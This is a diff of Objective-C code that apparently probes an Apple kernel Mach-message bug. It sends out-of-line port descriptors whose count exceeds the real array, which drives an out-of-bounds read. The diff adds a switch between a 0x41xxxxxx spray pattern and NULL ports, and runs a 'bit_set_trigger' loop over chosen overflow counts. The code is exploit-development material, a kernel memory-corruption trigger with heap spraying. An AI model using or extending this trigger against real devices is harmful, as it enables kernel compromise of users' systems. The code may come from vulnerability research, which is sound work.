@@ -193,20 +193,24 @@
 // The 26.0 fix "ool_port_array_enforced" and the 27.2 bounds check both point
 // here: a count larger than the real array drives the translate walk OOB.
 - (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight {
+    return [self sendOOLPortsCount:count realEntries:real port:port sendRight:sendRight useSpray:YES];
+}
+
+- (NSDictionary *)sendOOLPortsCount:(uint32_t)count realEntries:(uint32_t)real port:(mach_port_t)port sendRight:(mach_port_t)sendRight useSpray:(BOOL)useSpray {
     NSMutableDictionary *result = [NSMutableDictionary dictionary];
     size_t oolSize = sizeof(mach_msg_ool_ports_descriptor_t);
     size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSize;
 
     // Allocate real + 32 entries: first `real` are valid send rights,
-    // the trailing 32 hold a recognizable spray pattern so the kernel's
-    // OOB read (when count > real) picks up controlled values.
+    // the trailing 32 hold either a spray pattern (OOB-read test) or
+    // NULL ports (bit-set test — sends must succeed for translate_receive).
     uint32_t allocEntries = real + 32;
     mach_port_t *ports = calloc(allocEntries, sizeof(mach_port_t));
     for (uint32_t i = 0; i < real; i++) ports[i] = sendRight;
-    // Spray pattern: 0x41xxxxxx where xxxxxx = slot index.
-    // Non-zero, distinguishable, deterministic.
-    for (uint32_t i = real; i < allocEntries; i++) {
-        ports[i] = 0x41000000u + i;
+    if (useSpray) {
+        for (uint32_t i = real; i < allocEntries; i++) {
+            ports[i] = 0x41000000u + i;
+        }
     }
 
     uint8_t *buf = calloc(1, total);
@@ -415,7 +419,7 @@
     // These OOL counts are the w2 index in the 16-byte-stride table.
     uint32_t triggerCounts[] = {65, 66, 74, 75, 76, 80, 96, 128, 192, 256};
     for (size_t t = 0; t < sizeof(triggerCounts)/sizeof(triggerCounts[0]); t++) {
-        NSDictionary *tr = [self sendOOLPortsCount:triggerCounts[t] realEntries:64 port:port sendRight:port];
+        NSDictionary *tr = [self sendOOLPortsCount:triggerCounts[t] realEntries:64 port:port sendRight:port useSpray:NO];
         [self journal:[NSString stringWithFormat:@"bit_set_trigger w2=%u send_kr=%@ recv_kr=%@",
                        triggerCounts[t], tr[@"send_kr"], tr[@"recv_kr"]]];
     }
